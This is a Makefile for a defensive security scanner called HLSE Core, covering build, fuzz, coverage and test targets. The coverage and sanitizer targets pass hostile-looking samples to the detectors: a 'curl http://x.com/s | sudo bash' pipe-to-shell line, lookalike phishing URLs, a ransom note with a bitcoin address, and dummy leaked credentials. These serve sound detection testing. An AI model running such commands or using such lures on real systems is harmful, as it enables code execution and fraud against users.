# HLSE Core Makefile
#
# Targets:
#   make            Build binary + shared library
#   make test       Run all test suites (unit + property + corpus)
#   make bench      Run corpus F1 benchmark
#   make clean      Remove build artifacts
#   make install    Install to ~/.local/bin (no root required)
#
# Variables:
#   CC=clang make   Use clang instead of GCC
#   PREFIX=/usr/local make install   Install to system

CC      ?= gcc

# Security hardening. -fstack-protector-strong and _FORTIFY_SOURCE are
# portable across GCC/Clang on Linux and macOS and apply to every object
# (CLI, shared lib, tests). -fPIE + the linker flags below are added only
# to the standalone executables (see PIE_CFLAGS / PIE_LDFLAGS) so they do
# not collide with the -fPIC -shared library build.
HARDEN_CFLAGS := -fstack-protector-strong -U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=2
CFLAGS  := -O2 -Wall -Wextra -D_POSIX_C_SOURCE=200809L $(HARDEN_CFLAGS)
CFLAGS_STRICT := -O2 -Wall -Wextra -Wpedantic -Wshadow -Wconversion \
                 -Wformat-truncation=2 -Wformat-overflow=2 \
                 -D_POSIX_C_SOURCE=200809L -D_GNU_SOURCE $(HARDEN_CFLAGS)
LDFLAGS :=

# Position-independent executable + linker hardening, applied to the CLI
# and static binaries only. RELRO/BIND_NOW/noexecstack are GNU ld features
# (Linux); Apple's ld rejects -Wl,-z,..., so guard by OS.
UNAME_S    := $(shell uname -s)
PIE_CFLAGS := -fPIE
ifeq ($(UNAME_S),Linux)
PIE_LDFLAGS    := -pie -Wl,-z,relro -Wl,-z,now -Wl,-z,noexecstack
STATIC_LDFLAGS := -static-pie
else
PIE_LDFLAGS    := -pie
STATIC_LDFLAGS := -static
endif

PREFIX  ?= $(HOME)/.local
DESTDIR ?=
BINDIR  := $(DESTDIR)$(PREFIX)/bin
LIBDIR  := $(DESTDIR)$(PREFIX)/lib
INCDIR  := $(DESTDIR)$(PREFIX)/include/hlse
MANDIR  := $(DESTDIR)$(PREFIX)/share/man/man1
DATADIR := $(DESTDIR)$(PREFIX)/share/hlse

# Source files
CORE_SRC  := hlse_core.c hlse_text.c hlse_protect.c hlse_secrets.c hlse_supply.c hlse_file.c hlse_audit.c hlse_util.c hlse_alert.c
TEST_SRC  := tests/hlse_property_tests.c

# Outputs
BINARY    := hlse_core
SHARED    := libhlse.so
SERVER_BIN := hlse-server
SERVER_TEST := tests/server_tests
PROP_BIN  := tests/property_tests
PROT_BIN  := tests/protect_tests
SECR_BIN  := tests/secrets_tests
SUPP_BIN  := tests/supply_tests
FAUD_BIN  := tests/file_audit_tests
UTIL_BIN  := tests/util_tests

FUZZ_BIN  := tests/fuzz
FUZZ_ASAN := tests/fuzz_asan

FUZZ_SECRETS      := tests/fuzz_secrets
FUZZ_SECRETS_ASAN := tests/fuzz_secrets_asan
FUZZ_SUPPLY       := tests/fuzz_supply
FUZZ_SUPPLY_ASAN  := tests/fuzz_supply_asan
FUZZ_FILE         := tests/fuzz_file
FUZZ_FILE_ASAN    := tests/fuzz_file_asan
FUZZ_URL          := tests/fuzz_url
FUZZ_URL_ASAN     := tests/fuzz_url_asan
FUZZ_SERVER       := tests/fuzz_server
FUZZ_SERVER_ASAN  := tests/fuzz_server_asan

# ─── primary targets ─────────────────────────────────────────────────────

.PHONY: all cli lib static server server-check test bench clean install uninstall coverage fuzz fuzz-asan check-warnings asan-test

all: $(BINARY) $(SHARED) $(SERVER_BIN)

cli: $(BINARY)         ## build CLI binary only
lib: $(SHARED)         ## build shared library only

$(BINARY): $(CORE_SRC) hlse_text.h hlse_core.h hlse_protect.h
	$(CC) $(CFLAGS) $(PIE_CFLAGS) -D_GNU_SOURCE -o $@ $(CORE_SRC) $(PIE_LDFLAGS) -I. -lm
	@printf '  %-20s %s\n' "CC" "$@"

$(SHARED): $(CORE_SRC) hlse_text.h hlse_core.h hlse_protect.h
	$(CC) $(CFLAGS) -D_GNU_SOURCE -DHLSE_CORE_AS_LIB -fPIC -shared \
		-o $@ $(CORE_SRC) -I. -lm
	@printf '  %-20s %s\n' "CC (shared)" "$@"

server: $(SERVER_BIN)   ## build the HTTP API + dashboard server

server-check: $(SERVER_BIN)   ## end-to-end smoke test of the running server
	@bash tests/server_integration.sh ./$(SERVER_BIN) ./web

$(SERVER_BIN): hlse_server.c $(CORE_SRC) hlse_core.h hlse_secrets.h hlse_file.h
	$(CC) $(CFLAGS) $(PIE_CFLAGS) -pthread -D_GNU_SOURCE -DHLSE_CORE_AS_LIB -o $@ hlse_server.c $(CORE_SRC) $(PIE_LDFLAGS) -I. -lm -lpthread
	@printf '  %-20s %s\n' "CC" "$@"

$(PROP_BIN): $(TEST_SRC) hlse_text.c hlse_text.h
	@mkdir -p tests
	$(CC) $(CFLAGS) -o $@ $(TEST_SRC) hlse_text.c -I.
	@printf '  %-20s %s\n' "CC" "$@"

$(PROT_BIN): tests/hlse_protect_tests.c hlse_protect.c hlse_protect.h
	@mkdir -p tests
	$(CC) $(CFLAGS) -D_GNU_SOURCE -o $@ tests/hlse_protect_tests.c hlse_protect.c hlse_util.c -I. -lm
	@printf '  %-20s %s\n' "CC" "$@"

$(SECR_BIN): tests/hlse_secrets_tests.c hlse_secrets.c hlse_secrets.h hlse_util.c
	@mkdir -p tests
	$(CC) $(CFLAGS) -D_GNU_SOURCE -o $@ tests/hlse_secrets_tests.c hlse_secrets.c hlse_util.c -I. -lm
	@printf '  %-20s %s\n' "CC" "$@"

$(SUPP_BIN): tests/hlse_supply_tests.c hlse_supply.c hlse_supply.h
	@mkdir -p tests
	$(CC) $(CFLAGS) -o $@ tests/hlse_supply_tests.c hlse_supply.c hlse_util.c -I. -lm
	@printf '  %-20s %s\n' "CC" "$@"

$(FAUD_BIN): tests/hlse_file_audit_tests.c hlse_file.c hlse_file.h hlse_audit.c hlse_audit.h hlse_util.c hlse_util.h
	@mkdir -p tests
	$(CC) $(CFLAGS) -D_GNU_SOURCE -o $@ tests/hlse_file_audit_tests.c hlse_file.c hlse_audit.c hlse_util.c -I. -lm
	@printf '  %-20s %s\n' "CC" "$@"

$(UTIL_BIN): tests/hlse_util_tests.c hlse_util.c hlse_util.h
	@mkdir -p tests
	$(CC) $(CFLAGS) -o $@ tests/hlse_util_tests.c hlse_util.c -I. -lm
	@printf '  %-20s %s\n' "CC" "$@"

$(FUZZ_BIN): tests/hlse_fuzz.c hlse_text.c hlse_text.h
	@mkdir -p tests
	$(CC) -O0 -g -Wall -Wextra -D_POSIX_C_SOURCE=200809L -o $@ tests/hlse_fuzz.c hlse_text.c -I.
	@printf '  %-20s %s\n' "CC" "$@"

$(FUZZ_ASAN): tests/hlse_fuzz.c hlse_text.c hlse_text.h
	@mkdir -p tests
	$(CC) -O1 -g -Wall -Wextra -D_POSIX_C_SOURCE=200809L \
		-fsanitize=address,undefined \
		-o $@ tests/hlse_fuzz.c hlse_text.c -I.
	@printf '  %-20s %s\n' "CC (ASAN)" "$@"

$(FUZZ_SECRETS): tests/hlse_secrets_fuzz.c hlse_secrets.c hlse_secrets.h hlse_util.c
	@mkdir -p tests
	$(CC) -O0 -g -Wall -Wextra -D_POSIX_C_SOURCE=200809L \
		-o $@ tests/hlse_secrets_fuzz.c hlse_secrets.c hlse_util.c -I. -lm
	@printf '  %-20s %s\n' "CC" "$@"

$(FUZZ_SECRETS_ASAN): tests/hlse_secrets_fuzz.c hlse_secrets.c hlse_secrets.h hlse_util.c
	@mkdir -p tests
	$(CC) -O1 -g -Wall -Wextra -D_POSIX_C_SOURCE=200809L \
		-fsanitize=address,undefined \
		-o $@ tests/hlse_secrets_fuzz.c hlse_secrets.c hlse_util.c -I. -lm
	@printf '  %-20s %s\n' "CC (ASAN)" "$@"

$(FUZZ_SUPPLY): tests/hlse_supply_fuzz.c hlse_supply.c hlse_supply.h hlse_util.c
	@mkdir -p tests
	$(CC) -O0 -g -Wall -Wextra -D_POSIX_C_SOURCE=200809L \
		-o $@ tests/hlse_supply_fuzz.c hlse_supply.c hlse_util.c -I. -lm
	@printf '  %-20s %s\n' "CC" "$@"

$(FUZZ_SUPPLY_ASAN): tests/hlse_supply_fuzz.c hlse_supply.c hlse_supply.h hlse_util.c
	@mkdir -p tests
	$(CC) -O1 -g -Wall -Wextra -D_POSIX_C_SOURCE=200809L \
		-fsanitize=address,undefined \
		-o $@ tests/hlse_supply_fuzz.c hlse_supply.c hlse_util.c -I. -lm
	@printf '  %-20s %s\n' "CC (ASAN)" "$@"

$(FUZZ_FILE): tests/hlse_file_fuzz.c hlse_file.c hlse_file.h
	@mkdir -p tests
	$(CC) -O0 -g -Wall -Wextra -D_POSIX_C_SOURCE=200809L -D_GNU_SOURCE \
		-o $@ tests/hlse_file_fuzz.c hlse_file.c -I.
	@printf '  %-20s %s\n' "CC" "$@"

$(FUZZ_FILE_ASAN): tests/hlse_file_fuzz.c hlse_file.c hlse_file.h
	@mkdir -p tests
	$(CC) -O1 -g -Wall -Wextra -D_POSIX_C_SOURCE=200809L -D_GNU_SOURCE \
		-fsanitize=address,undefined \
		-o $@ tests/hlse_file_fuzz.c hlse_file.c -I.
	@printf '  %-20s %s\n' "CC (ASAN)" "$@"

$(FUZZ_URL): tests/hlse_url_fuzz.c hlse_core.c hlse_text.c hlse_util.c hlse_core.h
	@mkdir -p tests
	$(CC) -O0 -g -Wall -Wextra -D_POSIX_C_SOURCE=200809L -DHLSE_CORE_AS_LIB \
		-o $@ tests/hlse_url_fuzz.c hlse_core.c hlse_text.c hlse_util.c -I. -lm
	@printf '  %-20s %s\n' "CC" "$@"

$(FUZZ_URL_ASAN): tests/hlse_url_fuzz.c hlse_core.c hlse_text.c hlse_util.c hlse_core.h
	@mkdir -p tests
	$(CC) -O1 -g -Wall -Wextra -D_POSIX_C_SOURCE=200809L -DHLSE_CORE_AS_LIB \
		-fsanitize=address,undefined \
		-o $@ tests/hlse_url_fuzz.c hlse_core.c hlse_text.c hlse_util.c -I. -lm
	@printf '  %-20s %s\n' "CC (ASAN)" "$@"

$(FUZZ_SERVER): tests/hlse_server_fuzz.c hlse_server.c $(CORE_SRC) hlse_core.h hlse_secrets.h
	@mkdir -p tests
	$(CC) -O0 -g -Wall -Wextra -Wno-unused-function -Wno-format-truncation \
		-D_POSIX_C_SOURCE=200809L \
		-D_GNU_SOURCE -DHLSE_CORE_AS_LIB -DHLSE_SERVER_NO_MAIN \
		-o $@ tests/hlse_server_fuzz.c $(CORE_SRC) -I. -lm -lpthread
	@printf '  %-20s %s\n' "CC" "$@"

$(FUZZ_SERVER_ASAN): tests/hlse_server_fuzz.c hlse_server.c $(CORE_SRC) hlse_core.h hlse_secrets.h
	@mkdir -p tests
	$(CC) -O1 -g -Wall -Wextra -Wno-unused-function -Wno-format-truncation \
		-Wno-stringop-overread -D_POSIX_C_SOURCE=200809L \
		-D_GNU_SOURCE -DHLSE_CORE_AS_LIB -DHLSE_SERVER_NO_MAIN \
		-fsanitize=address,undefined \
		-o $@ tests/hlse_server_fuzz.c $(CORE_SRC) -I. -lm -lpthread
	@printf '  %-20s %s\n' "CC (ASAN)" "$@"

# Extended (out-of-distribution) corpus
EXT_BIN   := tests/corpus_ext

$(EXT_BIN): tests/hlse_corpus_extended.c hlse_core.c hlse_text.c hlse_text.h
	@mkdir -p tests
	$(CC) $(CFLAGS) -DHLSE_CORE_AS_LIB -o $@ \
		tests/hlse_corpus_extended.c hlse_core.c hlse_text.c hlse_util.c -I. -lm
	@printf '  %-20s %s\n' "CC" "$@"

# ─── coverage ────────────────────────────────────────────────────────────

coverage:
	@rm -f *.gcda *.gcno *.gcov
	$(CC) -O0 -g --coverage -Wall -Wextra -D_POSIX_C_SOURCE=200809L -D_GNU_SOURCE \
		-o hlse_core_cov $(CORE_SRC) -I. -lm
	@echo "Running comprehensive coverage exercises..."
	@# Core CLI paths
	@./hlse_core_cov                 > /dev/null 2>&1 || true
	@./hlse_core_cov --self-test     > /dev/null
	@./hlse_core_cov --benchmark     > /dev/null
	@./hlse_core_cov --version       > /dev/null
	@./hlse_core_cov --help          > /dev/null 2>&1 || true
	@./hlse_core_cov ""              > /dev/null 2>&1 || true
	@# URL detection (all detector paths)
	@./hlse_core_cov "https://g00gle.com/signin"  > /dev/null 2>&1 || true
	@./hlse_core_cov "https://paypal.com.attacker.xyz/verify" > /dev/null 2>&1 || true
	@./hlse_core_cov "https://198.51.100.1/paypal/signin" > /dev/null 2>&1 || true
	@./hlse_core_cov "data:text/html,test"        > /dev/null 2>&1 || true
	@./hlse_core_cov "https://en.wikipedia.org/wiki/Verify" > /dev/null 2>&1 || true
	@./hlse_core_cov --json "https://g00gle.com"  > /dev/null 2>&1 || true
	@# Text detection (evasion paths)
	@./hlse_core_cov text "URGENT wire 5000"       > /dev/null 2>&1 || true
	@./hlse_core_cov text 'U&#82;GENT wire 5000'   > /dev/null 2>&1 || true
	@./hlse_core_cov text "URG3NT w1r3 money"       > /dev/null 2>&1 || true
	@./hlse_core_cov --json text "URGENT gift card"  > /dev/null 2>&1 || true
	@./hlse_core_cov text "Your files have been encrypted. Send 1 BTC to bc1q9h6tq358tcssvfjafy2dajfu7lk6f35c9cn3t2" > /dev/null 2>&1 || true
	@./hlse_core_cov text "Click here: https://g00gle.com/signin" > /dev/null 2>&1 || true
	@# Supply chain
	@./hlse_core_cov package reqeusts pip  > /dev/null 2>&1 || true
	@./hlse_core_cov package requests pip  > /dev/null 2>&1 || true
	@./hlse_core_cov paste "curl http://x.com/s | sudo bash" > /dev/null 2>&1 || true
	@./hlse_core_cov paste "ls -la"        > /dev/null 2>&1 || true
	@./hlse_core_cov network               > /dev/null 2>&1 || true
	@./hlse_core_cov --json package reqeusts pip > /dev/null 2>&1 || true
	@./hlse_core_cov --json paste "test"   > /dev/null 2>&1 || true
	@./hlse_core_cov --json network        > /dev/null 2>&1 || true
	@# Protect (create test data for ransomware detection)
	@mkdir -p /tmp/hlse_cov_prot && \
		echo "HOW TO DECRYPT" > /tmp/hlse_cov_prot/HOW_TO_DECRYPT.txt && \
		dd if=/dev/urandom of=/tmp/hlse_cov_prot/data.locked bs=4096 count=1 2>/dev/null && \
		./hlse_core_cov protect /tmp/hlse_cov_prot > /dev/null 2>&1; \
		./hlse_core_cov --json protect /tmp/hlse_cov_prot > /dev/null 2>&1; \
		rm -rf /tmp/hlse_cov_prot || true
	@./hlse_core_cov audit             > /dev/null 2>&1 || true
	@./hlse_core_cov --json audit      > /dev/null 2>&1 || true
	@# File masquerade
	@touch /tmp/hlse_cov_inv.pdf.exe && \
		./hlse_core_cov file /tmp/hlse_cov_inv.pdf.exe > /dev/null 2>&1; \
		./hlse_core_cov --json file /tmp/hlse_cov_inv.pdf.exe > /dev/null 2>&1; \
		rm -f /tmp/hlse_cov_inv.pdf.exe || true
	@echo "safe" > /tmp/hlse_cov_safe.txt && \
		./hlse_core_cov file /tmp/hlse_cov_safe.txt > /dev/null 2>&1; \
		rm -f /tmp/hlse_cov_safe.txt || true
	@# Scan (directory walker)
	@mkdir -p /tmp/hlse_cov_scan/sub && \
		echo "AKIAIOSFODNN7EXAMPLE" > /tmp/hlse_cov_scan/creds.env && \
		echo "safe" > /tmp/hlse_cov_scan/sub/ok.txt && \
		touch /tmp/hlse_cov_scan/invoice.pdf.exe && \
		./hlse_core_cov scan /tmp/hlse_cov_scan > /dev/null 2>&1; \
		./hlse_core_cov --json scan /tmp/hlse_cov_scan > /dev/null 2>&1; \
		rm -rf /tmp/hlse_cov_scan || true
	@./hlse_core_cov scan /tmp/hlse_cov_nonexistent > /dev/null 2>&1 || true
	@# Stdin
	@printf 'https://g00gle.com\nURGENT wire money\n' | ./hlse_core_cov --stdin > /dev/null 2>&1 || true
	@printf 'https://github.com\nMeeting tomorrow\n' | ./hlse_core_cov --stdin --json > /dev/null 2>&1 || true
	@# Secrets via stdin
	@echo "AKIAIOSFODNN7EXAMPLE" | ./hlse_core_cov --stdin > /dev/null 2>&1 || true
	@echo "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" | ./hlse_core_cov --stdin > /dev/null 2>&1 || true
	@# Quiet mode
	@./hlse_core_cov -q "https://g00gle.com" > /dev/null 2>&1 || true
	@# ── Run unit tests against the SAME instrumented objects so that
	@#    internal functions exercised only by tests (email forensics,
	@#    crypto-swap, MBR ransom, edit distance, etc.) are counted. The
	@#    test binaries are built from the same -fprofile source files,
	@#    accumulating into the shared .gcda files. ──
	@$(CC) -O0 -g --coverage -D_POSIX_C_SOURCE=200809L -D_GNU_SOURCE \
		-o hlse_cov_secrets tests/hlse_secrets_tests.c hlse_secrets.c hlse_util.c \
		-I. -lm 2>/dev/null && ./hlse_cov_secrets > /dev/null 2>&1 || true
	@$(CC) -O0 -g --coverage -D_POSIX_C_SOURCE=200809L -D_GNU_SOURCE \
		-o hlse_cov_protect tests/hlse_protect_tests.c hlse_protect.c hlse_util.c \
		-I. -lm 2>/dev/null && ./hlse_cov_protect > /dev/null 2>&1 || true
	@$(CC) -O0 -g --coverage -D_POSIX_C_SOURCE=200809L -D_GNU_SOURCE \
		-o hlse_cov_supply tests/hlse_supply_tests.c hlse_supply.c hlse_util.c \
		-I. -lm 2>/dev/null && ./hlse_cov_supply > /dev/null 2>&1 || true
	@$(CC) -O0 -g --coverage -D_POSIX_C_SOURCE=200809L -D_GNU_SOURCE \
		-o hlse_cov_fileaud tests/hlse_file_audit_tests.c hlse_file.c hlse_audit.c hlse_util.c \
		-I. -lm 2>/dev/null && ./hlse_cov_fileaud > /dev/null 2>&1 || true
	@# Collect and report (CLI binary objects)
	@gcov hlse_core_cov-hlse_core hlse_core_cov-hlse_text \
		hlse_core_cov-hlse_protect hlse_core_cov-hlse_secrets \
		hlse_core_cov-hlse_supply hlse_core_cov-hlse_file \
		hlse_core_cov-hlse_audit 2>&1 \
		| grep -E "File|Lines executed"
	@echo "── coverage including unit-test exercise of internal functions ──"
	@gcov hlse_cov_secrets-hlse_secrets hlse_cov_protect-hlse_protect \
		hlse_cov_supply-hlse_supply hlse_cov_fileaud-hlse_file \
		hlse_cov_fileaud-hlse_audit 2>&1 \
		| grep -E "File|Lines executed"
	@rm -f hlse_core_cov hlse_cov_secrets hlse_cov_protect hlse_cov_supply \
		hlse_cov_fileaud *.gcda *.gcno

# ─── fuzz ────────────────────────────────────────────────────────────────

fuzz: $(FUZZ_BIN) $(FUZZ_SECRETS) $(FUZZ_SUPPLY) $(FUZZ_FILE) $(FUZZ_URL) $(FUZZ_SERVER)
	@echo "--- text fuzz ---"
	./$(FUZZ_BIN) 100000 1
	@echo "--- secrets fuzz ---"
	./$(FUZZ_SECRETS) 100000 1
	@echo "--- supply-chain fuzz ---"
	./$(FUZZ_SUPPLY) 100000 1
	@echo "--- file-masquerade fuzz ---"
	./$(FUZZ_FILE) 100000 1
	@echo "--- URL fuzz ---"
	./$(FUZZ_URL) 100000 1
	@echo "--- server JSON parser fuzz ---"
	./$(FUZZ_SERVER) 100000 1

fuzz-asan: $(FUZZ_ASAN) $(FUZZ_SECRETS_ASAN) $(FUZZ_SUPPLY_ASAN) $(FUZZ_FILE_ASAN) $(FUZZ_URL_ASAN) $(FUZZ_SERVER_ASAN)
	@echo "--- text fuzz (ASan) ---"
	./$(FUZZ_ASAN) 10000 1
	@echo "--- secrets fuzz (ASan) ---"
	./$(FUZZ_SECRETS_ASAN) 10000 1
	@echo "--- supply-chain fuzz (ASan) ---"
	./$(FUZZ_SUPPLY_ASAN) 10000 1
	@echo "--- file-masquerade fuzz (ASan) ---"
	./$(FUZZ_FILE_ASAN) 10000 1
	@echo "--- URL fuzz (ASan) ---"
	./$(FUZZ_URL_ASAN) 10000 1
	@echo "--- server JSON parser fuzz (ASan) ---"
	./$(FUZZ_SERVER_ASAN) 10000 1

# ─── quality gates (used by CI) ──────────────────────────────────────────

# Compile every module under strict flags; any warning fails the build.
# This is the gate that keeps -Wpedantic -Wshadow -Wconversion clean.
check-warnings:
	@echo "Checking strict warnings (-Wpedantic -Wshadow -Wconversion)..."
	@fail=0; for f in $(CORE_SRC); do \
		w=$$($(CC) $(CFLAGS_STRICT) -c $$f -I. -o /dev/null 2>&1 | grep -c "warning:"); \
		if [ "$$w" -ne 0 ]; then \
			echo "  FAIL: $$f has $$w warning(s)"; \
			$(CC) $(CFLAGS_STRICT) -c $$f -I. -o /dev/null 2>&1 | grep "warning:"; \
			fail=1; \
		else \
			echo "  OK:   $$f"; \
		fi; \
	done; \
	if [ "$$fail" -ne 0 ]; then echo "STRICT WARNINGS FOUND"; exit 1; fi; \
	echo "All modules clean under strict flags (CLI build)."
	@echo "Checking strict warnings in library build (-DHLSE_CORE_AS_LIB)..."
	@fail=0; for f in $(CORE_SRC); do \
		w=$$($(CC) $(CFLAGS_STRICT) -DHLSE_CORE_AS_LIB -fPIC -c $$f -I. -o /dev/null 2>&1 | grep -c "warning:"); \
		if [ "$$w" -ne 0 ]; then \
			echo "  FAIL: $$f has $$w warning(s) in library mode"; \
			$(CC) $(CFLAGS_STRICT) -DHLSE_CORE_AS_LIB -fPIC -c $$f -I. -o /dev/null 2>&1 | grep "warning:"; \
			fail=1; \
		else \
			echo "  OK:   $$f"; \
		fi; \
	done; \
	if [ "$$fail" -ne 0 ]; then echo "STRICT WARNINGS FOUND (library build)"; exit 1; fi; \
	echo "All modules clean under strict flags (CLI + library builds)."

# Build the CLI + tests with ASan/UBSan and run the full self-test.
# Catches memory errors, UB, and leaks that normal builds miss.
asan-test:
	@echo "Building with AddressSanitizer + UBSan..."
	$(CC) -O1 -g -fsanitize=address,undefined -fno-omit-frame-pointer \
		-D_POSIX_C_SOURCE=200809L -D_GNU_SOURCE \
		-o hlse_core_asan $(CORE_SRC) -I. -lm
	@echo "Running self-test under sanitizers..."
	@./hlse_core_asan --self-test
	@./hlse_core_asan --benchmark > /dev/null
	@./hlse_core_asan "https://g00gle.com" > /dev/null 2>&1 || true
	@./hlse_core_asan text "URGENT wire money" > /dev/null 2>&1 || true
	@printf 'test\nhttps://paypal.com.evil.xyz\n' | ./hlse_core_asan --stdin > /dev/null 2>&1 || true
	@mkdir -p /tmp/hlse_asan_scan && echo "AKIAIOSFODNN7EXAMPLE" > /tmp/hlse_asan_scan/k.env && \
		./hlse_core_asan scan /tmp/hlse_asan_scan > /dev/null 2>&1 || true; \
		rm -rf /tmp/hlse_asan_scan
	@printf '# baseline\n0123456789abcdef ENV_SECRET k.env\n' > /tmp/hlse_asan_base.txt && \
		mkdir -p /tmp/hlse_asan_bscan && echo "AKIAIOSFODNN7EXAMPLE" > /tmp/hlse_asan_bscan/k.env && \
		./hlse_core_asan --baseline /tmp/hlse_asan_base.txt scan /tmp/hlse_asan_bscan > /dev/null 2>&1 || true; \
		rm -rf /tmp/hlse_asan_bscan /tmp/hlse_asan_base.txt
	@mkdir -p /tmp/hlse_asan_esp && \
		printf 'MZ your files have been encrypted' > /tmp/hlse_asan_esp/boot.efi && \
		./hlse_core_asan esp /tmp/hlse_asan_esp > /dev/null 2>&1 || true; \
		rm -rf /tmp/hlse_asan_esp
	@rm -f hlse_core_asan
	@echo "ASan/UBSan: clean."

# ─── test ────────────────────────────────────────────────────────────────

test: $(BINARY) $(PROP_BIN) $(EXT_BIN) $(PROT_BIN) $(SECR_BIN) $(SUPP_BIN) $(FAUD_BIN) $(UTIL_BIN) $(SERVER_TEST)
	@echo ""
	@echo "═══════════════════════════════════════"
	@echo " HLSE Core — Test Suite"
	@echo "═══════════════════════════════════════"
	@echo ""
	@echo "── Unit tests (URL + text) ─────────────"
	@./$(BINARY) --self-test
	@echo ""
	@echo "── Property & invariant tests ──────────"
	@./$(PROP_BIN)
	@echo ""
	@echo "── Protection module tests ─────────────"
	@./$(PROT_BIN)
	@echo ""
	@echo "── Secrets module tests ─────────────────"
	@./$(SECR_BIN)
	@echo ""
	@echo "── Supply chain defense tests ──────────"
	@./$(SUPP_BIN)
	@echo ""
	@echo "── File masquerade + system audit tests ─"
	@./$(FAUD_BIN)
	@echo ""
	@echo "── Shared utility tests ────────────────"
	@./$(UTIL_BIN)
	@echo ""
	@echo "── HTTP server + JSON parser tests ─────"
	@./$(SERVER_TEST)
	@echo ""
	@echo "── In-distribution corpus benchmark ────"
	@./$(BINARY) --benchmark
	@echo ""
	@echo "── Out-of-distribution corpus ──────────"
	@./$(EXT_BIN)
	@echo ""
	@echo "── CLI integration ─────────────────────"
	@bash tests/cli_integration.sh
	@echo ""
	@echo "═══════════════════════════════════════"
	@echo " All test suites passed"
	@echo "═══════════════════════════════════════"

$(SERVER_TEST): tests/hlse_server_tests.c hlse_server.c $(CORE_SRC) hlse_core.h hlse_secrets.h hlse_file.h
	@mkdir -p tests
	$(CC) $(CFLAGS) -Wno-unused-function -pthread -D_GNU_SOURCE -DHLSE_CORE_AS_LIB -DHLSE_SERVER_NO_MAIN -o $@ tests/hlse_server_tests.c $(CORE_SRC) -I. -lm -lpthread
	@printf '  %-20s %s\n' "CC" "$@"

bench: $(BINARY)
	./$(BINARY) --benchmark

# ─── static binary (portable, no glibc needed) ──────────────────────────

static: hlse_core_static

hlse_core_static: $(CORE_SRC) hlse_text.h hlse_core.h hlse_protect.h
	$(CC) $(CFLAGS) $(PIE_CFLAGS) -D_GNU_SOURCE $(STATIC_LDFLAGS) -o $@ $(CORE_SRC) -I. -lm
	strip $@
	@printf '  %-20s %s (%s bytes)\n' "CC (static)" "$@" "$$(wc -c < $@)"

# ─── install / uninstall ─────────────────────────────────────────────────

install: $(BINARY) $(SHARED)
	@mkdir -p $(BINDIR) $(LIBDIR) $(INCDIR) $(MANDIR) $(DATADIR)/web
	cp $(BINARY) $(BINDIR)/hlse_core
	cp $(SHARED) $(LIBDIR)/libhlse.so
	cp hlse_core.h hlse_text.h hlse_protect.h hlse_secrets.h \
	   hlse_supply.h hlse_file.h hlse_audit.h $(INCDIR)/
	cp hlse.1 $(MANDIR)/hlse.1
	cp hlse-server.1 $(MANDIR)/hlse-server.1
	cp web/index.html web/app.js web/style.css $(DATADIR)/web/
	$(CC) $(CFLAGS) $(PIE_CFLAGS) -pthread -D_GNU_SOURCE -DHLSE_CORE_AS_LIB \
		-DHLSE_DEFAULT_WEBROOT='"$(PREFIX)/share/hlse/web"' \
		-o $(BINDIR)/hlse-server hlse_server.c $(CORE_SRC) $(PIE_LDFLAGS) -I. -lm -lpthread
	@echo "Installed:"
	@echo "  $(BINDIR)/hlse_core"
	@echo "  $(BINDIR)/hlse-server  (webroot defaults to $(PREFIX)/share/hlse/web)"
	@echo "  $(LIBDIR)/libhlse.so"
	@echo "  $(INCDIR)/*.h"
	@echo "  $(MANDIR)/hlse.1"
	@echo "  $(MANDIR)/hlse-server.1"
	@echo "  $(DATADIR)/web/*"
	@echo ""
	@echo "Compile against: gcc -I$(PREFIX)/include -L$(PREFIX)/lib -lhlse -lm"

uninstall:
	rm -f $(BINDIR)/hlse_core $(BINDIR)/hlse-server $(LIBDIR)/libhlse.so \
		$(MANDIR)/hlse.1 $(MANDIR)/hlse-server.1
	rm -rf $(INCDIR) $(DATADIR)

# ─── clean ───────────────────────────────────────────────────────────────

clean:
	rm -f $(BINARY) $(SHARED) $(PROP_BIN) $(PROT_BIN) $(SECR_BIN) $(SUPP_BIN) $(FAUD_BIN) $(UTIL_BIN) \
		$(FUZZ_BIN) $(FUZZ_ASAN) \
		$(FUZZ_SECRETS) $(FUZZ_SECRETS_ASAN) \
		$(FUZZ_SUPPLY) $(FUZZ_SUPPLY_ASAN) \
		$(FUZZ_FILE) $(FUZZ_FILE_ASAN) \
		$(FUZZ_URL) $(FUZZ_URL_ASAN) \
		$(FUZZ_SERVER) $(FUZZ_SERVER_ASAN) \
		$(EXT_BIN) $(SERVER_BIN) $(SERVER_TEST)
	rm -f hlse_core_static hlse_core_cov *.gcov *.gcda *.gcno *.o
	@echo "Clean complete"
